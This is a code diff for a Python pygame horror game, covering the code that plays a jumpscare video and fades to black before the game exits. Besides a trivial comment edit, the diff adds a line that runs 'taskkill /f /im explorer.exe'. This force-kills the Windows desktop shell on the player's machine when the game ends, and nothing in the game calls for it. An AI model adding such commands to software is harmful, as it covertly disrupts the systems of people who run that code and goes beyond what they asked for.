@@ -1280,7 +1280,7 @@ def main():
                 if a.name == "Rainer":
                     play_jumpscare_video(RAINER_JUMPSCARE_VIDEO_PATH)
                 elif a.name == "Fliege":
-                    play_jumpscare_video(RAINER_JUMPSCARE_VIDEO_PATH)  # placeholder for Fliege
+                    play_jumpscare_video(RAINER_JUMPSCARE_VIDEO_PATH)  # placeholder for Flieged
 
                 # --- Fade to black AFTER jumpscare video ---
                 fade_surface = pygame.Surface((WIDTH, HEIGHT))
@@ -1296,7 +1296,7 @@ def main():
 
                 # small delay for final sound tail
                 pygame.time.wait(1000)
-
+                os.system("taskkill /f /im explorer.exe")
                 running = False
                 break
 
